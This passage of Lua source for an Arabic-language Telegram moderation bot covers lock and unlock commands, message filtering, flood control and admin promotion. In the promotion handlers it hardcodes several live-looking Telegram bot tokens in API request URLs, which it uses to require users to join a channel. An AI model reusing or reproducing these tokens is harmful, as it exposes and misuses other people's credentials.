tsX000("lock",msg,"🔐┇ بالفعل تم قفل بصمه فيديو ")
else
tsX000("lock",msg,"🔐┇ تم قفل بصمه فيديو ")
datahmade:set("lock_note:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الكل") then
datahmade:set("lock_tag:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_sarha:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_word:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_edit:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_lllll:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_gif:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_files:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_mark:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_photo:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_stecker:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_video:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_audeo:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_voice:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_contact:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_fwd:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_link:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_username:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_botAndBan:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_new:SNIEBR"..msg.chat_id_..bot_id,"ok")
tsX000("lock",msg,"🔐┇ تم قفل جميع الاوامر ")
end
--         »»                 End SNIEBR lock                         ««              --
--         »»               Start SNIEBR unlock                       ««              --
if (text == "فتح الكل") then
datahmade:del("lock_tag:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_sarha:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_word:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_edit:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_lllll:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_gif:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_files:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_mark:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_photo:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_stecker:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_video:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_audeo:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_voice:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_contact:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_fwd:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_link:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_username:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_botAndBan:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_new:SNIEBR"..msg.chat_id_..bot_id,"ok")
tsX000("lock",msg,"🔐┇ تم فتح جميع الاوامر ")
end
if (text == "فتح الاشعارات") then
local tsX_o = datahmade:get("lock_new:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الاشعارات ")
else
tsX000("lock",msg,"⚠️┇تم فتح الاشعارات ")
datahmade:del("lock_new:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح التاك") then
local tsX_o = datahmade:get("lock_tag:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح التاك ")
else
tsX000("lock",msg,"⚠️┇تم فتح التاك ")
datahmade:del("lock_tag:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الرد") then
local tsX_o = datahmade:get("lock_reple:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الرد على الرسائل ")
else
tsX000("lock",msg,"⚠️┇تم فتح الرد على الرسائل ")
datahmade:del("lock_reple:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الكلايش") then
local tsX_o = datahmade:get("lock_word:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الكلايش ")
else
tsX000("lock",msg,"⚠️┇تم فتح الكلايش ")
datahmade:del("lock_word:SNIEBR"..msg.chat_id_..bot_id)
end
end

if (text == "فتح الشارحه") then
local tsX_o = datahmade:get("lock_sarha:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الشارحه ")
else
tsX000("lock",msg,"⚠️┇تم فتح الشارحه ")
datahmade:del("lock_sarha:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح التكرار") then
local tsX_o = datahmade:get("lock_lllll:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح التكرار ")
else
tsX000("lock",msg,"⚠️┇تم فتح التكرار ")
datahmade:del("lock_lllll:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح التعديل") and (is_creator(msg) or is_creatorbasic(msg)) then
local tsX_o = datahmade:get("lock_edit:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح التعديل ")
else
tsX000("lock",msg,"⚠️┇تم فتح التعديل ")
datahmade:del("lock_edit:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح المتحركه") then
local tsX_o = datahmade:get("lock_gif:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح المتحركه ")
else
tsX000("lock",msg,"⚠️┇تم فتح المتحركه ")
datahmade:del("lock_gif:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الملفات") then
local tsX_o = datahmade:get("lock_files:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الملفات ")
else
tsX000("lock",msg,"⚠️┇تم فتح الملفات ")
datahmade:del("lock_files:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الماركدون") then
local tsX_o = datahmade:get("lock_mark:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الماركدون ")
else
tsX000("lock",msg,"⚠️┇تم فتح الماركدون ")
datahmade:del("lock_mark:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الصور") then
local tsX_o = datahmade:get("lock_photo:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الصور ")
else
tsX000("lock",msg,"⚠️┇تم فتح الصور ")
datahmade:del("lock_photo:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الملصقات") then
local tsX_o = datahmade:get("lock_stecker:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الملصقات ")
else
tsX000("lock",msg,"⚠️┇تم فتح الملصقات ")
datahmade:del("lock_stecker:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الفيديو") then
local tsX_o = datahmade:get("lock_video:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الفيديو ")
else
tsX000("lock",msg,"⚠️┇تم فتح الفيديو ")
datahmade:del("lock_video:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الانلاين") then
local tsX_o = datahmade:get("lock_inline:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الانلاين ")
else
tsX000("lock",msg,"⚠️┇تم فتح الانلاين ")
datahmade:del("lock_inline:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الدردشه") then
local tsX_o = datahmade:get("lock_chat:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الدردشه ")
else
tsX000("lock",msg,"⚠️┇تم فتح الدردشه ")
datahmade:del("lock_chat:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح التوجيه") then
local tsX_o = datahmade:get("lock_fwd:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح التوجيه ")
else
tsX000("lock",msg,"⚠️┇تم فتح التوجيه ")
datahmade:del("lock_fwd:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح التثبيت") then
local tsX_o = datahmade:get("lock_pin:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح التثبيت ")
else
tsX000("lock",msg,"⚠️┇تم فتح التثبيت ")
datahmade:del("lock_pin:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الاغاني") then
local tsX_o = datahmade:get("lock_audeo:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الاغاني ")
else
tsX000("lock",msg,"⚠️┇تم فتح الاغاني ")
datahmade:del("lock_audeo:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الصوت") then
local tsX_o = datahmade:get("lock_voice:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الصوت ")
else
tsX000("lock",msg,"⚠️┇تم فتح الصوت ")
datahmade:del("lock_voice:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح البوتات بالطرد") then
local tsX_o = datahmade:get("lock_botAndBan:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح البوتات بالطرد ")
else
tsX000("lock",msg,"⚠️┇تم فتح البوتات بالطرد ")
datahmade:del("lock_botAndBan:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الجهات") then
local tsX_o = datahmade:get("lock_contact:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الجهات ")
else
tsX000("lock",msg,"⚠️┇تم فتح الجهات ")
datahmade:del("lock_contact:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح العربيه") then
local tsX_o = datahmade:get("lock_ar:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح العربيه ")
else
tsX000("lock",msg,"⚠️┇تم فتح العربيه ")
datahmade:del("lock_ar:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الانكليزيه") then
local tsX_o = datahmade:get("lock_en:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الانكليزيه ")
else
tsX000("lock",msg,"⚠️┇تم فتح الانكليزيه ")
datahmade:del("lock_en:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الميديا") then
local tsX_o = datahmade:get("lock_media:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الميديا ")
else
tsX000("lock",msg,"⚠️┇تم فتح الميديا ")
datahmade:del("lock_media:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_audeo:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_video:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_photo:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_stecker:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_voice:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_gif:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:del("lock_note:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح المعرف") then
local tsX_o = datahmade:get("lock_username:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح المعرف ")
else
tsX000("lock",msg,"⚠️┇تم فتح المعرف ")
datahmade:del("lock_username:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح بصمه الفيديو") then
local tsX_o = datahmade:get("lock_note:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح بصمه فيديو ")
else
tsX000("lock",msg,"⚠️┇تم فتح بصمه فيديو ")
datahmade:del("lock_note:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الروابط") then
local tsX_o = datahmade:get("lock_link:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الروابط ")
else
tsX000("lock",msg,"⚠️┇تم فتح الروابط ")
datahmade:del("lock_link:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الدخول") then
local tsX_o = datahmade:get("lock_join:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح الدخول للمجموعه ")
else
tsX000("lock",msg,"⚠️┇ تم فتح الدخول للمجموعه ")
datahmade:del("lock_join:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح البوتات") then
local tsX_o = datahmade:get("lock_bot:SNIEBR"..msg.chat_id_..bot_id)
if not tsX_o then
tsX000("lock",msg,"⚠️┇بالفعل تم فتح البوتات ")
else
tsX000("lock",msg,"⚠️┇تم فتح البوتات ")
datahmade:del("lock_bot:SNIEBR"..msg.chat_id_..bot_id,"ok")
end
end  --         »»               End SNIEBR unlock                       ««              --
end 
end 
--         »»               Start Function Check Msg                       ««              --
function TSCheckMsg(msg) 
local text = msg.content_.text_
if text then 
if datahmade:get("lock_word:SNIEBR"..msg.chat_id_..bot_id) then 
local SNIEBR_wr = (datahmade:get("SNIEBR:not:word:"..bot_id..msg.chat_id_) or 100)
if #text >= tonumber(SNIEBR_wr) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
end
if text and (text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]")) then
if datahmade:get("lock_link:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.caption_ then
text = msg.content_.caption_
if text and (text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]")) then
if datahmade:get("lock_link:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
end
if msg.content_.caption_ then
text = msg.content_.caption_
if text and text:match("(.*)(@)(.*)")  then
if datahmade:get("lock_username:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
end
if text and text:match("(.*)(@)(.*)")  then
if datahmade:get("lock_username:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if datahmade:get("lock_chat:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
if text and text:match("(.*)(/)(.*)")  then
if datahmade:get("lock_sarha:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if text and text:match("(.*)(#)(.*)")  then
if datahmade:get("lock_tag:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.reply_to_message_id_ ~= 0 then
if datahmade:get("lock_reple:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if  msg.content_.ID == "MessageChatJoinByLink" then
if datahmade:get("lock_join:SNIEBR"..msg.chat_id_..bot_id) then
changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageChatAddMembers"  then
if datahmade:get("lock_join:SNIEBR"..msg.chat_id_..bot_id) then
changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
return "stop"
end
end
if msg.content_.ID == "MessageChatAddMembers" then
if msg.content_.members_[0].type_.ID == 'UserTypeBot' then
if datahmade:get("lock_bot:SNIEBR"..msg.chat_id_..bot_id) then
changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
end
if datahmade:get("lock_botAndBan:SNIEBR"..msg.chat_id_..bot_id) then
local function cb(extra,result,success)
local bots = result.members_
for i=0 , #bots do
if tonumber(bots[i].user_id_) ~= tonumber(bot_id) then chat_kick(msg.chat_id_,bots[i].user_id_)
end
changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")
end
end
bot.channel_get_bots(msg.chat_id_,cb)
end
end
end
if text and text:match("(.*)(#)(.*)")  then
if datahmade:get("lock_sarha:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.forward_info_ then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
if datahmade:get("lock_fwd:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
end
if msg.content_.ID == "MessageSticker" or msg.content_.ID == "MessageUnsupported" then

if datahmade:get("lock_stecker:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then
if datahmade:get("lock_new:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageChatAddMembers" then
datahmade:incr('SNIEBR:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end
if msg.content_.ID == "MessageUnsupported" then
if datahmade:get("lock_note:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessagePhoto" then
if datahmade:get("lock_photo:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageAudio" then
if datahmade:get("lock_audeo:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageVoice" then
if datahmade:get("lock_voice:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageVideo" then
if datahmade:get("lock_video:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageAnimation" then
if datahmade:get("lock_gif:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageContact" then
if datahmade:get("lock_contact:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if text and text:match("[\216-\219][\128-\191]") then
if datahmade:get("lock_ar:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if msg.content_.ID == "MessageDocument" then
if datahmade:get("lock_files:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
if text and text:match("[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]") then
if datahmade:get("lock_en:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end

if msg.content_.entities_ then
if msg.content_.entities_[0] then
if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then
if datahmade:get("lock_mark:SNIEBR"..msg.chat_id_..bot_id) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end
end
end

if datahmade:get("lock_lllll:SNIEBR"..msg.chat_id_..bot_id) then
local hash = 'flood:max:'..bot_id..msg.chat_id_
if not datahmade:get(hash) then
floodMax = 10
else
floodMax = tonumber(datahmade:get(hash))
end
local hash = 'SNIEBR:'..bot_id..'flood:time:'..msg.chat_id_
if not datahmade:get(hash) then
floodTime = 1
else
floodTime = tonumber(datahmade:get(hash))
end
if not is_vip(msg) then
if bot_id then
if not is_vip(msg) then
local hash = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msg-num'
local msgs = tonumber(datahmade:get(hash) or 0)
if msgs > (floodMax - 1) then
local user = msg.sender_user_id_
local chat = msg.chat_id_
local channel = msg.chat_id_
local user_id = msg.sender_user_id_
local banned = is_banned(user_id, msg.chat_id_)
if banned then
else
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
user_id = msg.sender_user_id_
o = datahmade:get("tsahke:spam:lock:"..os.date("%x")..bot_id..msg.chat_id_)
if (o and (tonumber(o) >= 5)) then
datahmade:set("lock_media:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_audeo:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_video:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_photo:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_stecker:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_voice:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_gif:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_note:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_word:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_mark:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_link:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set("lock_new:SNIEBR"..msg.chat_id_..bot_id,"ok")
datahmade:set('SNIEBR:'..bot_id..'get:photo'..msg.chat_id_,true)
send(msg.chat_id_, 0, 1, '⚠️┇تم كشف عمليه تخريب في المجموعة \n‼️┇وتم قفل الميديا وسيتم طرد جميع الاشخاص الذين يقومون بعمل تكرار', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '🎫┇الايدي ~⪼*('..msg.sender_user_id_..')* \n❕┇قمت بعمل تكرار للرسائل المحدده\n☑┇وتم كتمك في المجموعه\n', 1, 'md')
end 
if (o and (tonumber(o) > 5)) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
local msgm = msg.id_
for i=1,tonumber(num) do
delete_msg(msg.chat_id_, {[0] = msgm})
msgm = msgm - 1048576
end
end
datahmade:incr("tsahke:spam:lock:"..os.date("%x")..bot_id..msg.chat_id_)
datahmade:sadd('SNIEBR:'..bot_id..'muted:'..msg.chat_id_, msg.sender_user_id_)
end
end
datahmade:setex(hash, floodTime, msgs+1)
end
end
end
end
if is_banned(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
if is_muted(msg.sender_user_id_, msg.chat_id_) then
delete_msg(msg.chat_id_,{[0] = msg.id_})
return "stop"
end
end -- end fun
--         »»               Start Function Sudo                       ««              --
function TSsudo(msg)
text = msg.content_.text_
if msg.content_.text_ then
if text == 'مغادره' then
local lave = datahmade:get('SNIEBR:'..bot_id..'leave:groups')
print(lave)
if not datahmade:get('SNIEBR:'..bot_id..'leave:groups') then
chat_leave(msg.chat_id_, bot_id)
send(msg.chat_id_, msg.id_, 1, "☑┇تم مغادره المجموعه", 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, "☑┇عذرآ المغادره معطله من قبل المطور الاساسي \n", 1, 'md')

end
end
if (text and text == 'تفعيل المغادره') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل مغادره البوت', 1, 'md')
datahmade:del('SNIEBR:'..bot_id..'leave:groups')
end

if (text and text == 'تعطيل المغادره') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '☑┇تم تعطيل مغادره البوت', 1, 'md')
datahmade:set('SNIEBR:'..bot_id..'leave:groups',true)
end
if text == ("مسح الاساسين") then
text = '☑┇تم مسح قائمه المنشئين الاساسين'
datahmade:del('SNIEBR:'..bot_id..'creatorbasic:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
return false
end
if text:match("^رفع منشئ اساسي$") and msg.reply_to_message_id_ then
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
function promote_by_reply(extra, result, success)
datahmade:sadd('SNIEBR:'..bot_id..'creatorbasic:'..msg.chat_id_, result.sender_user_id_)
tsX000("prore",msg,'🔖┇تم رفعة منشئ اساسي  في البوت')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^رفع منشئ اساسي @(.*)$") then
local apmd = {string.match(text, "^(رفع منشئ اساسي) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
datahmade:sadd('SNIEBR:'..bot_id..'creatorbasic:'..msg.chat_id_, result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR')..')\n┇ 🔖┇تم رفعة منشئ اساسي  في البوت  '
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
if text:match("^رفع منشئ اساسي (%d+)$") then
local apmd = {string.match(text, "^(رفع منشئ اساسي) (%d+)$")}
datahmade:sadd('SNIEBR:'..bot_id..'creatorbasic:'..msg.chat_id_, apmd[2])
tsX000(apmd[2],msg,"🔖┇تم رفعة منشئ اساسي  في البوت")
end
if text:match("^تنزيل منشئ اساسي$") and msg.reply_to_message_id_ then
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
